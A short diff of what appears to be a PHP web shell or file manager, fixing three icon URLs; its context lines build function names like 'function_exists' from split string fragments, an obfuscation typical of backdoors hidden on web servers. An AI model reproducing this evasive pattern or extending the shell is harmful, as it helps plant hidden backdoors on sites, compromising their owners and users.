@@ -77,9 +77,9 @@ $whiteSemiParent1 = "rgba(255,255,255,0.1)";
 $whiteSemiParent2 = "rgba(255,255,255,0.2)";
 $whiteSemiParent3 = "rgba(255,255,255,0.3)";
 $filesIcon = "https://raw.githubusercontent.com/"."InvisibleBunny"."/"."Records"."/main/Bunny-Code/img/files.png";
-$newFilesIcon = "https://raw.githubusercontent.com/"."InvisibleBunny"."/"."Records"."/main/Bunny-Code/img/files.png/new-files.png";
-$folderIcon = "https://raw.githubusercontent.com/"."InvisibleBunny"."/"."Records"."/main/Bunny-Code/img/files.png/folder.png";
-$newFolderIcon = "https://raw.githubusercontent.com/"."InvisibleBunny"."/"."Records"."/main/Bunny-Code/img/files.png/new-folder.png";
+$newFilesIcon = "https://raw.githubusercontent.com/"."InvisibleBunny"."/"."Records"."/main/Bunny-Code/img/new-files.png";
+$folderIcon = "https://raw.githubusercontent.com/"."InvisibleBunny"."/"."Records"."/main/Bunny-Code/img/folder.png";
+$newFolderIcon = "https://raw.githubusercontent.com/"."InvisibleBunny"."/"."Records"."/main/Bunny-Code/img/new-folder.png";
 function BunnyUname() {
     $SiBunny = 'h'.'tm'.'lspe'.'cialc'.'hars';
     $func_exist = "fu"."nc"."ti"."on"."_"."ex"."is"."ts";
